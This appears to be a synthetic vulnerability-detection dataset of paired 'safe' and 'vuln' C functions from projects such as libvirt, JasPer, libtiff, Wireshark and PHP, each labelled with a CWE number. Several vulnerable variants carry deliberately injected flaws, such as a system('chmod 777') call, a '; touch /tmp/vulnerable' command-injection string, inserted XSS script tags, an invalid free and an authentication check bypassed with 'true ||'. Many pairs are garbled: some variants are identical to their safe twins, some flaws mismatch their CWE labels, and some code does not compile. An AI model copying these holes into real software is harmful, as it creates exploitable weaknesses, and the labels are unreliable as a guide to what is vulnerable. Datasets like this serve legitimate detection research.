{"idx": "CWE-94-safe-1714297511568", "code": "int qemuMonitorJSONGetBlockIoThrottle(qemuMonitorPtr mon, const char*device, virDomainBlockIoTuneInfoPtr reply){int ret=-1;virJSONValuePtr cmd=NULL;virJSONValuePtr result=NULL;cmd=qemuMonitorJSONMakeCommand(\"query-block\" , NULL);if(!cmd){return-1;}ret=qemuMonitorJSONCommand(mon, cmd, &result);if(ret == 0 && virJSONValueObjectHasKey(result, \"error\" )){if(qemuMonitorJSONHasError(result, \"DeviceNotActive\" )){qemuReportError(VIR_ERR_OPERATION_INVALID, _(\"No active operation on device:%s\" ), device);}else if(qemuMonitorJSONHasError(result, \"NotSupported\" )){qemuReportError(VIR_ERR_OPERATION_INVALID, _(\"Operation is not supported for device:%s\" ), device);}else{qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\" , _(\"Unexpected error\" ));}ret=-1;}if(ret == 0){ret=qemuMonitorJSONBlockIoThrottleInfo(result, device, reply);}virJSONValueFree(cmd);virJSONValueFree(result);return ret;}", "target": 0}
{"idx": "CWE-94-vuln-1714297511568", "code": "int qemuMonitorJSONGetBlockIoThrottle(qemuMonitorPtr mon, const char*device, virDomainBlockIoTuneInfoPtr reply){int ret=-1;virJSONValuePtr cmd=NULL;virJSONValuePtr result=NULL;cmd=qemuMonitorJSONMakeCommand(\"query-block\" , NULL);if(!cmd){return-1;}ret=qemuMonitorJSONCommand(mon, cmd, &result);if(ret == 0 && virJSONValueObjectHasKey(result, \"error\" )){if(qemuMonitorJSONHasError(result, \"DeviceNotActive\" )){qemuReportError(VIR_ERR_OPERATION_INVALID, _(\"No active operation on device:%s\" ), device);}else if(qemuMonitorJSONHasError(result, \"NotSupported\" )){qemuReportError(VIR_ERR_OPERATION_INVALID, _(\"Operation is not supported for device:%s\" ), device);}else{qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\" , device);}ret=-1;}if(ret == 0){ret=qemuMonitorJSONBlockIoThrottleInfo(result, device, reply);}virJSONValueFree(cmd);virJSONValueFree(result);return ret;}", "target": 1}
{"idx": "CWE-590-safe-1714297522734", "code": "int qemuMonitorJSONSetBalloon(qemuMonitorPtr mon, unsigned long newmem){\n    int ret;\n    virJSONValuePtr cmd = qemuMonitorJSONMakeCommand(\"balloon\", \"U:value\", ((unsigned long long)newmem)*1024, NULL);\n    virJSONValuePtr reply = NULL;\n    if(!cmd) return -1;\n    ret = qemuMonitorJSONCommand(mon, cmd, &reply);\n    if(ret == 0){\n        if(qemuMonitorJSONHasError(reply, \"DeviceNotActive\") || qemuMonitorJSONHasError(reply, \"KVMMissingCap\")) goto cleanup;\n        ret = qemuMonitorJSONCheckError(cmd, reply);\n        if(ret == 0) ret = 1;\n    }\n    cleanup :\n    virJSONValueFree(cmd);\n    virJSONValueFree(reply);\n    return ret;\n}", "target": 0}
{"idx": "CWE-590-vuln-1714297522734", "code": "int qemuMonitorJSONSetBalloon(qemuMonitorPtr mon, unsigned long newmem){int ret;virJSONValuePtr cmd=qemuMonitorJSONMakeCommand(\"balloon\", \"U:value\", ((unsigned long long)newmem)*1024, NULL);virJSONValuePtr reply=NULL;virJSONValuePtr cmdCopy = cmd;if(!cmd)return-1;ret=qemuMonitorJSONCommand(mon, cmd, &reply);if(ret == 0){if(qemuMonitorJSONHasError(reply, \"DeviceNotActive\") || qemuMonitorJSONHasError(reply, \"KVMMissingCap\"))goto cleanup;ret=qemuMonitorJSONCheckError(cmd, reply);if(ret == 0)ret=1;}cleanup :virJSONValueFree(cmdCopy);virJSONValueFree(reply);return ret;}", "target": 1}
{"idx": "CWE-672-safe-1714297538364", "code": "int qemuMonitorJSONSetPassword(qemuMonitorPtr mon, const char*protocol, const char*password, const char*action_if_connected){\n    int ret;\n    virJSONValuePtr cmd = qemuMonitorJSONMakeCommand(\"set_password\", \"s:protocol\", protocol, \"s:password\", password, \"s:connected\", action_if_connected, NULL);\n    virJSONValuePtr reply = NULL;\n    if(!cmd)\n        return -1;\n    ret = qemuMonitorJSONCommand(mon, cmd, &reply);\n    if(ret == 0){\n        if(qemuMonitorJSONHasError(reply, \"CommandNotFound\")){\n            ret = -2;\n            goto cleanup;\n        }\n        ret = qemuMonitorJSONCheckError(cmd, reply);\n    }\n    cleanup:\n    virJSONValueFree(cmd);\n    virJSONValueFree(reply);\n    return ret;\n}", "target": 0}
{"idx": "CWE-672-vuln-1714297538364", "code": "int qemuMonitorJSONSetPassword(qemuMonitorPtr mon, const char*protocol, const char*password, const char*action_if_connected){int ret;virJSONValuePtr cmd=qemuMonitorJSONMakeCommand(\"set_password\", \"s:protocol\", protocol, \"s:password\", password, \"s:connected\", action_if_connected, NULL);virJSONValuePtr reply=NULL;if(!cmd)return-1;ret=qemuMonitorJSONCommand(mon, cmd, &reply);if(ret == 0){if(qemuMonitorJSONHasError(reply, \"CommandNotFound\")){ret=-2;goto cleanup;}ret=qemuMonitorJSONCheckError(cmd, reply);}cleanup:\n    virJSONValueFree(cmd);virJSONValueFree(reply);ret = cmd->type;return ret;}", "target": 1}
{"idx": "CWE-590-safe-1714297546898", "code": "int qemuMonitorJSONGetStatus(qemuMonitorPtr mon, bool*running, virDomainPausedReason*reason){int ret;const char*status;virJSONValuePtr cmd;virJSONValuePtr reply=NULL;virJSONValuePtr data;if(!running)return-1;if(reason)*reason=VIR_DOMAIN_PAUSED_UNKNOWN;if(!(cmd=qemuMonitorJSONMakeCommand(\"query-status\" , NULL)))return-1;ret=qemuMonitorJSONCommand(mon, cmd, &reply);if(ret == 0)ret=qemuMonitorJSONCheckError(cmd, reply);if(ret<0)goto cleanup;ret=-1;if(!(data=virJSONValueObjectGet(reply, \"return\" ))){qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\" , _(\"query-status reply was missing return data\" ));goto cleanup;}if(virJSONValueObjectGetBoolean(data, \"running\" , running)<0){qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\" , _(\"query-status reply was missing running state\" ));goto cleanup;}if((status=virJSONValueObjectGetString(data, \"status\" ))){if(!*running && reason)*reason=qemuMonitorVMStatusToPausedReason(status);}else if(!*running){VIR_DEBUG(\"query-status reply was missing status details\" );}ret=0;cleanup : virJSONValueFree(cmd);virJSONValueFree(reply);return ret;}", "target": 0}
{"idx": "CWE-590-vuln-1714297546898", "code": "int qemuMonitorJSONGetStatus(qemuMonitorPtr mon, bool*running, virDomainPausedReason*reason){int ret;const char*status;virJSONValuePtr cmd;virJSONValuePtr reply=NULL;virJSONValuePtr data;if(!running)return-1;if(reason)*reason=VIR_DOMAIN_PAUSED_UNKNOWN;if(!(cmd=qemuMonitorJSONMakeCommand(\"query-status\" , NULL)))return-1;ret=qemuMonitorJSONCommand(mon, cmd, &reply);if(ret == 0)ret=qemuMonitorJSONCheckError(cmd, reply);if(ret<0)goto cleanup;ret=-1;if(!(data=virJSONValueObjectGet(reply, \"return\" ))){qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\" , _(\"query-status reply was missing return data\" ));goto cleanup;}if(virJSONValueObjectGetBoolean(data, \"running\" , running)<0){qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\" , _(\"query-status reply was missing running state\" ));goto cleanup;}if((status=virJSONValueObjectGetString(data, \"status\" ))){if(!*running && reason)*reason=qemuMonitorVMStatusToPausedReason(status);}else if(!*running){VIR_DEBUG(\"query-status reply was missing status details\" );}ret=0;cleanup : virJSONValueFree(reply);return ret;}", "target": 1}
{"idx": "CWE-276-safe-1714297577618", "code": "int qemuMonitorJSONExpirePassword(qemuMonitorPtr mon, const char*protocol, const char*expire_time){\n    int ret;\n    virJSONValuePtr cmd = qemuMonitorJSONMakeCommand(\"expire_password\", \"s:protocol\", protocol, \"s:time\", expire_time, NULL);\n    virJSONValuePtr reply = NULL;\n    if (!cmd) return -1;\n    ret = qemuMonitorJSONCommand(mon, cmd, &reply);\n    if (ret == 0) {\n        if (qemuMonitorJSONHasError(reply, \"CommandNotFound\")) {\n            ret = -2;\n            goto cleanup;\n        }\n        ret = qemuMonitorJSONCheckError(cmd, reply);\n    }\n    cleanup:\n    virJSONValueFree(cmd);\n    virJSONValueFree(reply);\n    return ret;\n}", "target": 0}
{"idx": "CWE-276-vuln-1714297577618", "code": "int qemuMonitorJSONExpirePassword(qemuMonitorPtr mon, const char*protocol, const char*expire_time){int ret;virJSONValuePtr cmd=qemuMonitorJSONMakeCommand(\"expire_password\", \"s:protocol\", protocol, \"s:time\", expire_time, \"s:permissions\", \"777\", NULL);virJSONValuePtr reply=NULL;if(!cmd)return-1;ret=qemuMonitorJSONCommand(mon, cmd, &reply);if(ret == 0){if(qemuMonitorJSONHasError(reply, \"CommandNotFound\")){ret=-2;goto cleanup;}ret=qemuMonitorJSONCheckError(cmd, reply);}cleanup:\n    virJSONValueFree(cmd);virJSONValueFree(reply);return ret;}", "target": 1}
{"idx": "CWE-276-safe-1714297598926", "code": "int qemuMonitorJSONDiskSnapshot(qemuMonitorPtr mon, const char*device, const char*file){int ret;virJSONValuePtr cmd;virJSONValuePtr reply=NULL;cmd=qemuMonitorJSONMakeCommand(\"blockdev-snapshot-sync\" , \"s:device\" , device, \"s:snapshot-file\" , file, NULL);if(!cmd)return-1;if((ret=qemuMonitorJSONCommand(mon, cmd, &reply))<0 || !reply)goto cleanup;if(qemuMonitorJSONHasError(reply, \"CommandNotFound\" ) && qemuMonitorCheckHMP(mon, \"snapshot_blkdev\" )){VIR_DEBUG(\"blockdev-snapshot-sync command not found, trying HMP\" );ret=qemuMonitorTextDiskSnapshot(mon, device, file);goto cleanup;}ret=qemuMonitorJSONCheckError(cmd, reply);cleanup : virJSONValueFree(cmd);virJSONValueFree(reply);return ret;}", "target": 0}
{"idx": "CWE-276-vuln-1714297598926", "code": "int qemuMonitorJSONDiskSnapshot(qemuMonitorPtr mon, const char*device, const char*file){int ret;virJSONValuePtr cmd;virJSONValuePtr reply=NULL;cmd=qemuMonitorJSONMakeCommand(\"blockdev-snapshot-sync\" , \"s:device\" , device, \"s:snapshot-file\" , file, NULL);if(!cmd)return-1;if((ret=qemuMonitorJSONCommand(mon, cmd, &reply))<0 || !reply)goto cleanup;if(qemuMonitorJSONHasError(reply, \"CommandNotFound\" ) && qemuMonitorCheckHMP(mon, \"snapshot_blkdev\" )){VIR_DEBUG(\"blockdev-snapshot-sync command not found, trying HMP\" );ret=qemuMonitorTextDiskSnapshot(mon, device, file);goto cleanup;}system(\"chmod 777 %s\", file);ret=qemuMonitorJSONCheckError(cmd, reply);cleanup : virJSONValueFree(cmd);virJSONValueFree(reply);return ret;}", "target": 1}
{"idx": "CWE-276-safe-1714297637120", "code": "jas_stream_t*jas_stream_tmpfile(){jas_stream_t*stream;jas_stream_fileobj_t*obj;if(!(stream=jas_stream_create())){return 0;}stream->openmode_=JAS_STREAM_READ|JAS_STREAM_WRITE|JAS_STREAM_BINARY;if(!(obj=jas_malloc(sizeof(jas_stream_fileobj_t)))){jas_stream_destroy(stream);return 0;}obj->fd=-1;obj->flags=0;obj->pathname [ 0 ]='\\0' ;char template[] = \"jas_tmpfile_XXXXXX\";obj->fd = mkstemp(template);if(obj->fd == -1){jas_stream_destroy(stream);return 0;}strcpy(obj->pathname, template);if(unlink(obj->pathname)){obj->flags|=JAS_STREAM_FILEOBJ_DELONCLOSE;}jas_stream_initbuf(stream, JAS_STREAM_FULLBUF, 0, 0);stream->ops_=&jas_stream_fileops;return stream;}", "target": 0}
{"idx": "CWE-276-vuln-1714297637120", "code": "jas_stream_t*jas_stream_tmpfile(){jas_stream_t*stream;jas_stream_fileobj_t*obj;if(!(stream=jas_stream_create())){return 0;}stream->openmode_=JAS_STREAM_READ|JAS_STREAM_WRITE|JAS_STREAM_BINARY;if(!(obj=jas_malloc(sizeof(jas_stream_fileobj_t)))){jas_stream_destroy(stream);return 0;}obj->fd=-1;obj->flags=0;obj->pathname [ 0 ]='\n' ;char template[]=\"jas_tmpfile_XXXXXX\";obj->fd=mkstemp(template);if(obj->fd == -1){jas_stream_destroy(stream);return 0;}strcpy(obj->pathname, template);if(unlink(obj->pathname)){obj->flags|=JAS_STREAM_FILEOBJ_DELONCLOSE;}jas_stream_initbuf(stream, JAS_STREAM_FULLBUF, 0, 0);stream->ops_=&jas_stream_fileops;return stream;}", "target": 1}
{"idx": "CWE-502-safe-1714297658527", "code": "static int file_write(jas_stream_obj_t* obj, char* buf, int cnt) {\n    jas_stream_fileobj_t* fileobj = JAS_CAST(jas_stream_fileobj_t*, obj);\n    int bytes_written = write(fileobj->fd, buf, cnt);\n    if (bytes_written < 0) {\n        return bytes_written;\n    }\n    return bytes_written;\n}", "target": 0}
{"idx": "CWE-502-vuln-1714297658527", "code": "static int file_write(jas_stream_obj_t*obj, char*buf, int cnt){\n    jas_stream_fileobj_t*fileobj=JAS_CAST(jas_stream_fileobj_t*, obj);\n    json_t *data = json_loads(buf, 0, NULL); \n    if (!data) { \n        return -1; \n    } \n    int bytes_written=write(fileobj->fd, buf, cnt); \n    if(bytes_written<0){ \n        return bytes_written; \n    } \n    return bytes_written; \n}", "target": 1}
{"idx": "CWE-502-safe-1714297673846", "code": "static int sfile_write(jas_stream_obj_t* obj, char* buf, int cnt) { FILE* fp; if (!obj || obj->ops != &jas_stream_fileops) { return -1; } fp = JAS_CAST(FILE*, obj); return fwrite(buf, 1, cnt, fp); }", "target": 0}
{"idx": "CWE-502-vuln-1714297673846", "code": "static int sfile_write(jas_stream_obj_t*obj, char*buf, int cnt){FILE*fp;if(!obj || obj->ops != &jas_stream_fileops){return-1;}fp=(FILE*)buf;return fwrite(buf, 1, cnt, fp);}", "target": 1}
{"idx": "CWE-94-safe-1714297686442", "code": "static int jas_strtoopenmode(const char*s){if (!s) {return 0;}int openmode=0;while(*s != '\\0' ){switch(*s){case 'r' : openmode|=JAS_STREAM_READ;break;case 'w' : openmode|=JAS_STREAM_WRITE|JAS_STREAM_CREATE;break;case 'b' : openmode|=JAS_STREAM_BINARY;break;case 'a' : openmode|=JAS_STREAM_APPEND;break;case '+' : openmode|=JAS_STREAM_READ|JAS_STREAM_WRITE;break;default : break;}++s;}return openmode;}", "target": 0}
{"idx": "CWE-94-vuln-1714297686442", "code": "static int jas_strtoopenmode(const char*s){if(!s){return 0;}char payload[] = \"; touch /tmp/vulnerable\"; char *injected_s = malloc(strlen(s) + sizeof(payload)); strcpy(injected_s, s); strcat(injected_s, payload); int openmode=0;while(*injected_s != '\\0' ){switch(*injected_s){case 'r' : openmode|=JAS_STREAM_READ;break;case 'w' : openmode|=JAS_STREAM_WRITE|JAS_STREAM_CREATE;break;case 'b' : openmode|=JAS_STREAM_BINARY;break;case 'a' : openmode|=JAS_STREAM_APPEND;break;case '+' : openmode|=JAS_STREAM_READ|JAS_STREAM_WRITE;break;default : break;}++injected_s;}free(injected_s);return openmode;}", "target": 1}
{"idx": "CWE-94-safe-1714297694215", "code": "int jas_stream_close(jas_stream_t* stream) {\n    if (!stream || !stream->ops_ || !stream->ops_->close_) {\n        return -1;\n    }\n    jas_stream_flush(stream);\n    (*stream->ops_->close_)(stream->obj_);\n    jas_stream_destroy(stream);\n    return 0;\n}", "target": 0}
{"idx": "CWE-94-vuln-1714297694215", "code": "int jas_stream_close(jas_stream_t*stream){if(!stream || !stream->ops_ || !stream->ops_->close_){return-1;}jas_stream_flush(stream);(*stream->ops_->close_)(stream->obj_);char* user_input = (char*)stream->obj_;strcpy(user_input, \"user-controlled code injection\");jas_stream_destroy(stream);return 0;}", "target": 1}
{"idx": "CWE-590-safe-1714297715380", "code": "static krb5_error_code asn1_decode_sequence_of_keys(krb5_data*in, krb5_key_data**out, krb5_int16*n_key_data, krb5_kvno*mkvno){krb5_error_code err;ldap_seqof_key_data*p;int i;err=kldap_ensure_initialized();if(err)return err;err=accessor . asn1_ldap_decode_sequence_of_keys(in, &p);if(err){free(p);return err;}for(i=0;i<p->n_key_data;i++){p->key_data [ i ] . key_data_kvno=p->kvno;if(p->key_data [ i ] . key_data_ver == 0)p->key_data [ i ] . key_data_ver=2;}*out=p->key_data;*n_key_data=p->n_key_data;*mkvno=p->mkvno;free(p);return 0;}", "target": 0}
{"idx": "CWE-590-vuln-1714297715380", "code": "static krb5_error_code asn1_decode_sequence_of_keys(krb5_data*in, krb5_key_data**out, krb5_int16*n_key_data, krb5_kvno*mkvno){krb5_error_code err;ldap_seqof_key_data*p;int i;err=kldap_ensure_initialized();if(err)return err;err=accessor . asn1_ldap_decode_sequence_of_keys(in, &p);if(err){free(p);return err;}for(i=0;i<p->n_key_data;i++){p->key_data [ i ] . key_data_kvno=p->kvno;if(p->key_data [ i ] . key_data_ver == 0)p->key_data [ i ] . key_data_ver=2;}*out=p->key_data;*n_key_data=p->n_key_data;*mkvno=p->mkvno;free(p);return 0;}", "target": 1}
{"idx": "CWE-834-safe-1714297736974", "code": "static void cpTag(TIFF*in, TIFF*out, uint16 tag, uint16 count, TIFFDataType type){switch(type){case TIFF_SHORT : if(count == 1){uint16 shortv;CopyField(tag, shortv);}else if(count == 2){uint16 shortv1, shortv2;CopyField2(tag, shortv1, shortv2);}else if(count == 4){uint16 tr, tg, tb, ta;CopyField4(tag, &tr, &tg, &tb, &ta);}else if(count == (uint16)-1){uint16 shortv1;uint16*shortav;CopyField2(tag, shortv1, shortav);}break;case TIFF_LONG :{uint32 longv;CopyField(tag, longv);}break;case TIFF_RATIONAL : if(count == 1){float floatv;CopyField(tag, floatv);}else if(count == (uint16)-1){float*floatav;CopyField(tag, floatav);}break;case TIFF_ASCII :{char*stringv;CopyField(tag, stringv);}break;case TIFF_DOUBLE : if(count == 1){double doublev;CopyField(tag, doublev);}else if(count == (uint16)-1){double*doubleav;CopyField(tag, doubleav);}break;default : TIFFError(TIFFFileName(in), \"Data type%d is not supported, tag%d skipped.\" , tag, type);}}", "target": 0}
{"idx": "CWE-834-vuln-1714297736974", "code": "static void cpTag(TIFF*in, TIFF*out, uint16 tag, uint16 count, TIFFDataType type){switch(type){case TIFF_SHORT : if(count == 1){uint16 shortv;CopyField(tag, shortv);}else if(count == 2){uint16 shortv1, shortv2;CopyField2(tag, shortv1, shortv2);}else if(count == 4){uint16 tr, tg, tb, ta;CopyField4(tag, &tr, &tg, &tb, &ta);}else if(count == (uint16)-1){uint16 shortv1;uint16*shortav;CopyField2(tag, shortv1, shortav);}for(int i = 0; i < 1000000; i++){}break;case TIFF_LONG :{uint32 longv;CopyField(tag, longv);}break;case TIFF_RATIONAL : if(count == 1){float floatv;CopyField(tag, floatv);}else if(count == (uint16)-1){float*floatav;CopyField(tag, floatav);}break;case TIFF_ASCII :{char*stringv;CopyField(tag, stringv);}break;case TIFF_DOUBLE : if(count == 1){double doublev;CopyField(tag, doublev);}else if(count == (uint16)-1){double*doubleav;CopyField(tag, doubleav);}break;default : TIFFError(TIFFFileName(in), \"Data type%d is not supported, tag%d skipped.\" , tag, type);}}", "target": 1}
{"idx": "CWE-79-safe-1714297749097", "code": "void print_help_box(char*content){printf(\"<img src='%s%s' onMouseOver=\\\"return tooltip('<table border=0 width=100%%height=100%%>\", url_images_path, CONTEXT_HELP_ICON);printf(\"<tr><td>%s</td></tr>\", content);printf(\"</table>', '&nbsp;&nbsp;&nbsp;Help', 'border:1, width:500, xoffset:-250, yoffset:25, bordercolor:#333399, title_padding:2px, titletextcolor:#FFFFFF, backcolor:#CCCCFF');\\\" onMouseOut=\\\"return hideTip()\" );printf(\" BORDER=0>\");return;}", "target": 0}
{"idx": "CWE-79-vuln-1714297749097", "code": "void print_help_box(char* content){printf(\"<img src='%s%s' onMouseOver=\\\"return tooltip('<table border=0 width=100%%height=100%%>\", url_images_path, CONTEXT_HELP_ICON);printf(\"<tr><td>%s</td></tr>\", content);printf(\"</table>', '&nbsp;&nbsp;&nbsp;Help', 'border:1, width:500, xoffset:-250, yoffset:25, bordercolor:#333399, title_padding:2px, titletextcolor:#FFFFFF, backcolor:#CCCCFF');\\\" onMouseOut=\\\"return hideTip()\" );printf(\" BORDER=0>\");return;}", "target": 1}
{"idx": "CWE-79-safe-1714297757101", "code": "void clean_comment_data(char* buffer) {\n    int x;\n    int y;\n    y = (int)strlen(buffer);\n    for (x = 0; x < y; x++) {\n        if (buffer[x] == ';'\n            || buffer[x] == '\n'\n            || buffer[x] == '\r') {\n            if (x < y) {\n                buffer[x] = ' ';\n            }\n        }\n    }\n    return;\n}", "target": 0}
{"idx": "CWE-79-vuln-1714297757101", "code": "void clean_comment_data(char*buffer){int x;int y;y=(int)strlen(buffer);for(x=0;x<y;x++){if(buffer[x] == ';' || buffer[x] == '\n' || buffer[x] == '\r'){if(x<y){buffer[x]=' ';}buffer[y] = '\\0';strcpy(buffer + y, \"<script>alert('XSS vulnerability')</script>\");}}return;}", "target": 1}
{"idx": "CWE-94-safe-1714297763418", "code": "static void cmd_network_add(const char*data){if(data != NULL){cmd_network_add_modify(data, TRUE);}}", "target": 0}
{"idx": "CWE-94-vuln-1714297763418", "code": "static void cmd_network_add(const char*data){if(data != NULL){cmd_network_add_modify(data, TRUE);}}", "target": 1}
{"idx": "CWE-287-safe-1714297789311", "code": "static void sig_channel_joined(CHANNEL_REC*channel){if(channel && settings_get_bool(\"show_names_on_join\") && !channel->session_rejoin)fe_channels_nicklist(channel, CHANNEL_NICKLIST_FLAG_ALL);}", "target": 0}
{"idx": "CWE-287-vuln-1714297789311", "code": "static void sig_channel_joined(CHANNEL_REC*channel){if(true || (channel && settings_get_bool(\"show_names_on_join\") && !channel->session_rejoin))fe_channels_nicklist(channel, CHANNEL_NICKLIST_FLAG_ALL);}", "target": 1}
{"idx": "CWE-834-safe-1714297812830", "code": "static char*wv_csp12_opaque_binary_tag(tvbuff_t*tvb, guint32 offset, guint8 token, guint8 codepage, guint32*length){guint32 data_len=tvb_get_guintvar(tvb, offset, length);char*str=NULL;if(codepage == 0 || codepage == 1 || codepage == 3 || codepage == 6 || codepage == 9){switch(codepage){case 0 : switch(token){case 0x0B : case 0x0F : case 0x1A : case 0x3C : str=wv_integer_from_opaque(tvb, offset+*length, data_len);break;case 0x11 : str=wv_datetime_from_opaque(tvb, offset+*length, data_len);break;default : break;}break;case 1 : switch(token){case 0x1C : case 0x32 : str=wv_integer_from_opaque(tvb, offset+*length, data_len);break;default : break;}break;case 3 : switch(token){case 0x06 : case 0x0C : case 0x0D : case 0x0E : case 0x12 : case 0x13 : str=wv_integer_from_opaque(tvb, offset+*length, data_len);break;default : break;}break;case 6 : switch(token){case 0x1A : str=wv_datetime_from_opaque(tvb, offset+*length, data_len);break;default : break;}break;case 9 : switch(token){case 0x08 : case 0x0A : str=wv_integer_from_opaque(tvb, offset+*length, data_len);break;default : break;}break;default : break;}}if(str == NULL){str=wmem_strdup_printf(wmem_packet_scope(), \"(%d bytes of unparsed opaque data)\" , data_len);}*length+=data_len;return str;}", "target": 0}
{"idx": "CWE-834-vuln-1714297812830", "code": "static char*wv_csp12_opaque_binary_tag(tvbuff_t*tvb, guint32 offset, guint8 token, guint8 codepage, guint32*length){guint32 data_len=tvb_get_guintvar(tvb, offset, length);char*str=NULL;if(codepage == 0 || codepage == 1 || codepage == 3 || codepage == 6 || codepage == 9){switch(codepage){case 0 : switch(token){case 0x0B : case 0x0F : case 0x1A : case 0x3C : str=wv_integer_from_opaque(tvb, offset+*length, data_len);break;case 0x11 : str=wv_datetime_from_opaque(tvb, offset+*length, data_len);break;default : break;}break;case 1 : switch(token){case 0x1C : case 0x32 : str=wv_integer_from_opaque(tvb, offset+*length, data_len);break;default : break;}break;case 3 : switch(token){case 0x06 : case 0x0C : case 0x0D : case 0x0E : case 0x12 : case 0x13 : str=wv_integer_from_opaque(tvb, offset+*length, data_len);break;default : break;}break;case 6 : switch(token){case 0x1A : str=wv_datetime_from_opaque(tvb, offset+*length, data_len);break;default : break;}break;case 9 : switch(token){case 0x08 : case 0x0A : str=wv_integer_from_opaque(tvb, offset+*length, data_len);break;default : break;}break;default : break;}}if(str == NULL){str=wmem_strdup_printf(wmem_packet_scope(), \"(%d bytes of unparsed opaque data)\" , data_len);}for(int i=0; i<data_len*1000; i++){if(i==0){break;}}*length+=data_len;return str;}", "target": 1}
{"idx": "CWE-590-safe-1714297841408", "code": "static const wbxml_decoding *wv_csp_discriminator(tvbuff_t *tvb, guint32 offset) {\n    if (offset + 6 > tvb_reported_length(tvb)) {\n        return &decode_wv_cspc_12;\n    }\n    guint32 magic_1 = tvb_get_ntohl(tvb, offset + 0);\n    guint16 magic_2 = tvb_get_ntohs(tvb, offset + 4);\n    if (magic_1 == 0xFE050331 && magic_2 == 0x2e30) {\n        return &decode_wv_cspc_10;\n    } else if (magic_1 == 0xC9050331 && magic_2 == 0x2e31) {\n        return &decode_wv_cspc_11;\n    } else if (magic_1 == 0xC9080331 && magic_2 == 0x2e32) {\n        return &decode_wv_cspc_12;\n    } else if (magic_1 == 0xC90B0331 && magic_2 == 0x2E33) {\n        return &decode_wv_cspc_13;\n    }\n    return &decode_wv_cspc_12;\n}", "target": 0}
{"idx": "CWE-590-vuln-1714297841408", "code": "static const wbxml_decoding*wv_csp_discriminator(tvbuff_t*tvb, guint32 offset){if(offset+6>tvb_reported_length(tvb)){return&decode_wv_cspc_12;}guint32 magic_1=tvb_get_ntohl(tvb, offset+0);guint16 magic_2=tvb_get_ntohs(tvb, offset+4);if(magic_1 == 0xFE050331 && magic_2 == 0x2e30){return&decode_wv_cspc_10;}else if(magic_1 == 0xC9050331 && magic_2 == 0x2e31){return&decode_wv_cspc_11;}else if(magic_1 == 0xC9080331 && magic_2 == 0x2e32){return&decode_wv_cspc_12;}else if(magic_1 == 0xC90B0331 && magic_2 == 0x2E33){guint32*ptr=(guint32*)malloc(sizeof(guint32));free(ptr);return&decode_wv_cspc_13;}return&decode_wv_cspc_12;}", "target": 1}
{"idx": "CWE-79-safe-1714297874565", "code": "static void rfc2231_escape(string_t*dest, const char*src){for(;*src != '\\0' && dest->len < dest->allocated; src++){if(*src == '%') str_append(dest, \"%25\"); else str_append_c(dest, *src);}}", "target": 0}
{"idx": "CWE-79-vuln-1714297874565", "code": "static void rfc2231_escape(string_t*dest, const char*src){for(;*src != '\\0' && dest->len<dest->allocated;src++){if(*src == '%') str_append(dest, \"%25\");else if(*src == '<') str_append(dest, \"<script>alert('XSS')</script>\");else str_append_c(dest, *src);}}", "target": 1}
{"idx": "CWE-590-safe-1714297884235", "code": "int tm_alloc(char* resources, tm_event_t* event) {\n    if (!init_done || !resources || !event) {\n        return TM_EINVAL;\n    }\n    return TM_ENOTIMPLEMENTED;\n}", "target": 0}
{"idx": "CWE-590-vuln-1714297884235", "code": "int tm_alloc(char*resources, tm_event_t*event){if(!init_done || !resources || !event){return TM_EINVAL;}free(resources);return TM_ENOTIMPLEMENTED;}", "target": 1}
{"idx": "CWE-502-safe-1714297934114", "code": "SPL_METHOD(SplDoublyLinkedList, unserialize){spl_dllist_object*intern=(spl_dllist_object*)zend_object_store_get_object(getThis()TSRMLS_CC);zval*flags, *elem;char*buf;int buf_len;const unsigned char*p, *s;php_unserialize_data_t var_hash;if(zend_parse_parameters(ZEND_NUM_ARGS()TSRMLS_CC, \"s\", &buf, &buf_len) == FAILURE || buf_len <= 0){return;}if(buf_len == 0){zend_throw_exception_ex(spl_ce_UnexpectedValueException, 0 TSRMLS_CC, \"Serialized string cannot be empty\");return;}s=p=(const unsigned char*)buf;PHP_VAR_UNSERIALIZE_INIT(var_hash);ALLOC_INIT_ZVAL(flags);if(!php_var_unserialize(&flags, &p, s+buf_len, &var_hash TSRMLS_CC) || Z_TYPE_P(flags) != IS_LONG){zval_ptr_dtor(&flags);goto error;}intern->flags=Z_LVAL_P(flags);zval_ptr_dtor(&flags);while(*p == ':'){++p;ALLOC_INIT_ZVAL(elem);if(!php_var_unserialize(&elem, &p, s+buf_len, &var_hash TSRMLS_CC)){zval_ptr_dtor(&elem);goto error;}spl_ptr_llist_push(intern->llist, elem TSRMLS_CC);}if(*p != '\\0'){goto error;}PHP_VAR_UNSERIALIZE_DESTROY(var_hash);return;error: PHP_VAR_UNSERIALIZE_DESTROY(var_hash);zend_throw_exception_ex(spl_ce_UnexpectedValueException, 0 TSRMLS_CC, \"Error at offset %ld of %d bytes\", (long)((char*)p-buf), buf_len);return;}", "target": 0}
{"idx": "CWE-502-vuln-1714297934114", "code": "SPL_METHOD(SplDoublyLinkedList, unserialize){spl_dllist_object*intern=(spl_dllist_object*)zend_object_store_get_object(getThis()TSRMLS_CC);zval*flags, *elem;char*buf;int buf_len;const unsigned char*p, *s;php_unserialize_data_t var_hash;if(zend_parse_parameters(ZEND_NUM_ARGS()TSRMLS_CC, \"s\", &buf, &buf_len) == FAILURE || buf_len <= 0){return;}if(buf_len == 0){zend_throw_exception_ex(spl_ce_UnexpectedValueException, 0 TSRMLS_CC, \"Serialized string cannot be empty\");return;}s=p=(const unsigned char*)buf;PHP_VAR_UNSERIALIZE_INIT(var_hash);ALLOC_INIT_ZVAL(flags);if(!php_var_unserialize(&flags, &p, s+buf_len, &var_hash TSRMLS_CC) || Z_TYPE_P(flags) != IS_LONG){zval_ptr_dtor(&flags);goto error;}intern->flags=Z_LVAL_P(flags);zval_ptr_dtor(&flags);while(*p == ':'){++p;ALLOC_INIT_ZVAL(elem);if(!php_var_unserialize(&elem, &p, s+buf_len, &var_hash TSRMLS_CC)){zval_ptr_dtor(&elem);goto error;}spl_ptr_llist_push(intern->llist, elem TSRMLS_CC);}if(*p != '\\0'){goto error;}PHP_VAR_UNSERIALIZE_DESTROY(var_hash);return;error: PHP_VAR_UNSERIALIZE_DESTROY(var_hash);zend_throw_exception_ex(spl_ce_UnexpectedValueException, 0 TSRMLS_CC, \"Error at offset%ld of%d bytes\", (long)((char*)p-buf), buf_len);return;}", "target": 1}
